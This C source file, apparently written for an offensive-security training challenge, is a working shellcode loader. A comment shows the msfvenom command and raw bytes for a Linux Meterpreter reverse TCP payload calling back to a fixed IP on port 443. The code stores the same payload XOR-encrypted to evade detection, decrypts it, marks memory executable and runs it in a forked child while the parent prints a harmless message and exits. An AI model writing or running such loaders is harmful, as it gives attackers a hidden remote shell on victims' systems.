#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h> // for mprotect #include <stdlib.h> #include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>


/*
root@kali:/osep/challenge3# msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.49.179 LPORT=443 -f c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of c file: 571 bytes

unsigned char buf[] = 
"\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
"\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x48\x85\xc0\x78\x51\x6a\x0a"
"\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
"\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00\x01\xbb\xc0\xa8"
"\x31\xb3\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x59"
"\x48\x85\xc0\x79\x25\x49\xff\xc9\x74\x18\x57\x6a\x23\x58\x6a"
"\x00\x6a\x05\x48\x89\xe7\x48\x31\xf6\x0f\x05\x59\x59\x5f\x48"
"\x85\xc0\x79\xc7\x6a\x3c\x58\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e"
"\x5a\x0f\x05\x48\x85\xc0\x78\xed\xff\xe6";
*/

// Encrypted shellcode
//./encryptpayload 
unsigned char buf[] = "\x23\x5A\x94\x01\x62\x33\xF2\xDD\x7B\x23\xE2\xBD\x26\x5A\xA2\x01\x49\x2A\x31\xD9\x6C\x64\x6E\x23\xEE\xAB\x13\x3A\x01\x61\x2A\x32\x3B\x01\x42\x33\xF2\x01\x69\x34\x01\x6A\x35\x64\x6E\x23\xEE\xAB\x13\x50\x23\xFC\x23\xD2\x69\x6B\x6A\xD0\xAB\xC3\x5A\xD8\x3A\x23\xE2\x8D\x01\x7B\x31\x01\x41\x33\x64\x6E\x32\x23\xEE\xAB\x12\x4E\x22\x94\xA2\x1F\x73\x3C\x01\x48\x33\x01\x6B\x01\x6E\x23\xE2\x8C\x23\x5A\x9D\x64\x6E\x32\x32\x34\x23\xEE\xAB\x12\xAC\x01\x57\x33\x01\x6A\x34\x64\x6E\x35\x01\x15\x31\x64\x6E\x23\xEE\xAB\x13\x86\x94\x8D\x6B";



int main (int argc, char **argv) {
    printf("I love programming.");


    //payload decryption
    int i;
    char xor_key = 'k';
    int arraysize = (int) sizeof(buf);

    for (i=0; i<arraysize-1; i++) {
        buf[i] = buf[i]^xor_key;
    }

    
    //Since the binary needs to return the value 3 and the shellcode will avoid the binary to finish, a child is created.
    //The child never ends because it runs the meterpreter
    //The parent ends with a return 3
    if (fork() == 0) {
        intptr_t pagesize = sysconf(_SC_PAGESIZE);
        if (mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)), pagesize, PROT_READ|PROT_EXEC)) {
            perror("mprotect");
            return -1; 
        }
        int (*ret)() = (int(*)())buf;
        ret();
    }
    else {
        printf("HACK: returning from function...\n");
    }
    return 3;
}
